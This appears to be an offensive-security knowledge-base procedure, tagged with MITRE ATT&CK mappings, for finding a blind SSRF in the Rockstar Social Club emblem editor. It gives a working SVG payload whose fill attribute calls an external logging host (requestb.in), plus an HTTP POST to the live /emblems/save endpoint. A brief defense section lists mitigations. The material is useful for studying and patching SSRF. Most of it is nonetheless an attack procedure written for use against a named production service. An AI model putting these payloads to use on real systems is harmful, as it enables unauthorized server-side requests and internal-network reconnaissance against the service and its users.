---
id: proc-uuid-001
tags:
  - ssrf
  - svg-injection
  - blind-ssrf
type: procedure
tools:
  - '[[tools/requestb-in]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/svg-fill-url-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.331Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject Absolute URL in SVG Fill for Blind SSRF Discovery

## Summary

This procedure discovers a blind SSRF vulnerability in the Rockstar Social Club emblem editor by injecting an absolute external URL into the SVG fill attribute, which is not properly validated, allowing the server to make outbound HTTP requests upon processing.

## Description

In the emblem editor, users upload SVGs that are processed server-side during publishing. By setting the fill attribute of an SVG path to 'url(https://external-domain#fragment)', the server fetches the URL when rendering the emblem. A fragment identifier is required to trigger the request. This was tested by submitting the SVG via the editor and confirming requests on a controlled server like requestb.in. Prerequisites include a logged-in account and access to the emblem editor.

## Requirements

1. Valid Rockstar Social Club account with emblem editor access
2. External server to log requests (e.g., requestb.in)
3. Browser for SVG submission

## Defense

Defensive measures and detection strategies:

- Validate and sanitize SVG attributes to block absolute URLs in url() functions
- Implement URL whitelisting or block external fetches in image processing libraries
- Monitor server logs for unexpected outbound HTTP requests to unknown domains

## Objectives

1. Confirm SSRF by observing server-initiated requests
2. Identify lack of validation on SVG fill properties
3. Establish foundation for escalation

## Instructions

### Step 1: Prepare SVG with Injected URL

**Context**: Craft an SVG payload with the fill attribute pointing to a controlled external endpoint to capture requests.

**Command** ([[commands/svg-fill-url-injection]]):
```xml
<path d="M0 0h24v24H0z" fill="url(https://requestb.in/15rxmgv1#test)" />
```

> This injects the URL; the fragment #test is necessary to trigger the fetch. Embed in a full <svg> tag and submit via the editor.

### Step 2: Submit SVG via Emblem Editor

**Context**: Upload the modified SVG to the editor to save the emblem locally.

**Command** (No direct command; use browser POST to /emblems/save):
```http
POST /emblems/save HTTP/1.1
Host: socialclub.rockstargames.com
Content-Type: application/json
{"svgData": "base64-encoded-SVG-with-injection"}
```

> Encode the SVG in base64 for the payload. Expected output: Emblem saved without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/svg-fill-url-injection]]

## Tools Used

- [[tools/requestb-in]]

## Tags

- ssrf
- svg-injection
